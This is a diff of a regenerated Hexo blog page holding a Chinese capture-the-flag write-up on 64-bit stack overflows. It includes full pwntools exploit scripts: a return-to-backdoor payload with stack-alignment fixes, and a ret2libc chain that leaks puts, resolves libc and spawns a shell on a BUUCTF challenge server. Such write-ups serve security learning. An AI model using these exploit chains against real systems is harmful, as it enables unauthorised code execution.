@@ -13,6 +13,8 @@
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
   <meta name="theme-color" content="#2f4154">
   <meta name="description" content="瞎写糊涂账">
   <meta name="author" content="renex">
@@ -52,7 +54,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 4.2.1"></head>
+<meta name="generator" content="Hexo 5.3.0"></head>
 
 
 <body>
@@ -104,18 +106,6 @@
               <a class="nav-link" href="/categories/">
                 <i class="iconfont icon-category-fill"></i>
                 Categories
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                Tags
               </a>
             </li>
           
@@ -177,7 +167,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1k 字
+      1.1k 字
     </span>
   
 
@@ -187,7 +177,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      15
+      17
        分钟
     </span>
   
@@ -228,9 +218,9 @@
 </li>
 </ul>
 <p>参考文章：</p>
-<p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">在一些64位的glibc的payload调用system函数失败问题</a></p>
-<p><a href="https://tearorca.github.io/32%E4%BD%8D%E5%92%8C64%E4%BD%8D%E5%9C%A8pwn%E4%B8%AD%E7%9A%84%E4%B8%8D%E5%90%8C%E7%82%B9/" target="_blank" rel="noopener">32位和64位在pwn中的不同点</a></p>
-<p><a href="https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html" target="_blank" rel="noopener">一步一步学ROP之linux_x64篇</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/958">在一些64位的glibc的payload调用system函数失败问题</a></p>
+<p><a target="_blank" rel="noopener" href="https://tearorca.github.io/32%E4%BD%8D%E5%92%8C64%E4%BD%8D%E5%9C%A8pwn%E4%B8%AD%E7%9A%84%E4%B8%8D%E5%90%8C%E7%82%B9/">32位和64位在pwn中的不同点</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html">一步一步学ROP之linux_x64篇</a></p>
 <a id="more"></a>
 <hr>
 <p>首先是一道看起来很简单的题：<br>rip(BUUCTF)<br>首先检查防护，全都没开</p>
@@ -242,9 +232,9 @@
 <p><img src="/2020/10/11/20-10-11/屏幕截图 2020-10-11 233734.jpg" srcset="/img/loading.gif" alt="屏幕截图 2020-10-11 233734"></p>
 <p>根据上述分析写exp如下：</p>
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29074</span>)
+io = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29074</span>)
 
-payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x0F</span>+<span class="hljs-number">0x08</span>) +p64(<span class="hljs-number">0x0401186</span>)
+payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x0F</span>+<span class="hljs-number">0x08</span>) +p64(<span class="hljs-number">0x0401186</span>)
 io.send(payload)
 io.interactive()</code></pre></div>
 <p>但是却出现了如下问题，程序直接停止</p>
@@ -252,17 +242,17 @@ io.interactive()</code></pre></div>
 <p>查看资料发现是64位程序system的问题</p>
 <p>尝试的解决办法有两种，一是加ret(直接在二进制文件里找即可)</p>
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29074</span>)
+io = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29074</span>)
 
 ret = <span class="hljs-number">0x0401185</span>
-payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x0F</span>+<span class="hljs-number">0x08</span>)+p64(ret) +p64(<span class="hljs-number">0x0401186</span>)
+payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x0F</span>+<span class="hljs-number">0x08</span>)+p64(ret) +p64(<span class="hljs-number">0x0401186</span>)
 io.send(payload)
 io.interactive()</code></pre></div>
 <p>或者改变返回的位置</p>
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29074</span>)
+io = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29074</span>)
 
-payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x0F</span>+<span class="hljs-number">0x08</span>)+p64(<span class="hljs-number">0x0401186</span>+<span class="hljs-number">1</span>)
+payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x0F</span>+<span class="hljs-number">0x08</span>)+p64(<span class="hljs-number">0x0401186</span>+<span class="hljs-number">1</span>)
 io.send(payload)
 io.interactive()</code></pre></div>
 <p>进一步通过gdb分析：</p>
@@ -300,72 +290,72 @@ io.interactive()</code></pre></div>
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
 
-io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29686</span>)
+io = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29686</span>)
 
-<span class="hljs-comment">#io=process('./buu_6')</span>
-<span class="hljs-comment">#context.terminal = ['tmux','splitw','-h']</span>
-<span class="hljs-comment">#gdb.attach(io,'break main')</span>
+<span class="hljs-comment">#io=process(&#x27;./buu_6&#x27;)</span>
+<span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span>
+<span class="hljs-comment">#gdb.attach(io,&#x27;break main&#x27;)</span>
 
-elf = ELF(<span class="hljs-string">'buu_6'</span>)
+elf = ELF(<span class="hljs-string">&#x27;buu_6&#x27;</span>)
 pop_rdi = <span class="hljs-number">0x0400c83</span>
-puts_plt_addr = elf.plt[<span class="hljs-string">'puts'</span>]
-puts_got_addr = elf.got[<span class="hljs-string">'puts'</span>]
-main_addr = elf.symbols[<span class="hljs-string">'main'</span>]
+puts_plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]
+puts_got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]
+main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]
 <span class="hljs-comment">#print(hex(puts_plt_addr))</span>
 <span class="hljs-comment">#print(hex(puts_got_addr))</span>
-payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x08</span>) + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
+payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x08</span>) + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
 
-io.recvuntil(<span class="hljs-string">"Input your choice!\n"</span>)
-io.sendline(<span class="hljs-string">"1"</span>)
-io.recvuntil(<span class="hljs-string">"Input your Plaintext to be encrypted\n"</span>)
+io.recvuntil(<span class="hljs-string">&quot;Input your choice!\n&quot;</span>)
+io.sendline(<span class="hljs-string">&quot;1&quot;</span>)
+io.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)
 io.sendline(payload)
 
-io.recvuntil(<span class="hljs-string">'\n'</span>)
-io.recvuntil(<span class="hljs-string">'\n'</span>)
-puts_addr = u64(io.recvuntil(<span class="hljs-string">'\n'</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))
-print(hex(puts_addr))</code></pre></div>
+io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)
+io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)
+puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))
+print(<span class="hljs-built_in">hex</span>(puts_addr))</code></pre></div>
 <p>因为是puts函数，直接用\n作为每行结尾标准。得到puts函数真实地址</p>
 <p>通过LibcSearcher找到相应libc版本，获得偏移之后即可得到system函数以及/bin/sh字符串</p>
 <p>完整exp如下：</p>
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
 
-io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29686</span>)
+io = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29686</span>)
 
-<span class="hljs-comment">#io=process('./buu_6')</span>
-<span class="hljs-comment">#context.terminal = ['tmux','splitw','-h']</span>
-<span class="hljs-comment">#gdb.attach(io,'break main')</span>
+<span class="hljs-comment">#io=process(&#x27;./buu_6&#x27;)</span>
+<span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span>
+<span class="hljs-comment">#gdb.attach(io,&#x27;break main&#x27;)</span>
 
-elf = ELF(<span class="hljs-string">'buu_6'</span>)
+elf = ELF(<span class="hljs-string">&#x27;buu_6&#x27;</span>)
 pop_rdi = <span class="hljs-number">0x0400c83</span>
-puts_plt_addr = elf.plt[<span class="hljs-string">'puts'</span>]
-puts_got_addr = elf.got[<span class="hljs-string">'puts'</span>]
-main_addr = elf.symbols[<span class="hljs-string">'main'</span>]
+puts_plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]
+puts_got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]
+main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]
 <span class="hljs-comment">#print(hex(puts_plt_addr))</span>
 <span class="hljs-comment">#print(hex(puts_got_addr))</span>
-payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x08</span>) + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
+payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x08</span>) + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
 
-io.recvuntil(<span class="hljs-string">"Input your choice!\n"</span>)
-io.sendline(<span class="hljs-string">"1"</span>)
-io.recvuntil(<span class="hljs-string">"Input your Plaintext to be encrypted\n"</span>)
+io.recvuntil(<span class="hljs-string">&quot;Input your choice!\n&quot;</span>)
+io.sendline(<span class="hljs-string">&quot;1&quot;</span>)
+io.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)
 io.sendline(payload)
 
-io.recvuntil(<span class="hljs-string">'\n'</span>)
-io.recvuntil(<span class="hljs-string">'\n'</span>)
-puts_addr = u64(io.recvuntil(<span class="hljs-string">'\n'</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))
+io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)
+io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)
+puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))
 <span class="hljs-comment">#print(hex(puts_addr))</span>
 
-libc = LibcSearcher(<span class="hljs-string">'puts'</span>,puts_addr)
-offset = puts_addr - libc.dump(<span class="hljs-string">'puts'</span>)
-sys_addr = offset + libc.dump(<span class="hljs-string">'system'</span>)
-bin_sh_addr = offset + libc.dump(<span class="hljs-string">'str_bin_sh'</span>)
+libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)
+offset = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)
+sys_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)
+bin_sh_addr = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)
 
 ret = <span class="hljs-number">0x4006b9</span>
-payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x08</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)+p64(<span class="hljs-number">0xdeadbeef</span>)
+payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x08</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)+p64(<span class="hljs-number">0xdeadbeef</span>)
 
-io.recvuntil(<span class="hljs-string">"Input your choice!\n"</span>)
-io.sendline(<span class="hljs-string">"1"</span>)
-io.recvuntil(<span class="hljs-string">"Input your Plaintext to be encrypted\n"</span>)
+io.recvuntil(<span class="hljs-string">&quot;Input your choice!\n&quot;</span>)
+io.sendline(<span class="hljs-string">&quot;1&quot;</span>)
+io.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)
 io.sendline(payload)
 
 io.interactive()</code></pre></div>
@@ -385,7 +375,7 @@ io.interactive()</code></pre></div>
                 
               </div>
               
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
               
               
                 <div class="post-prevnext row">
@@ -607,6 +597,45 @@ io.interactive()</code></pre></div>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js" ></script>
+
+  
 
 
 
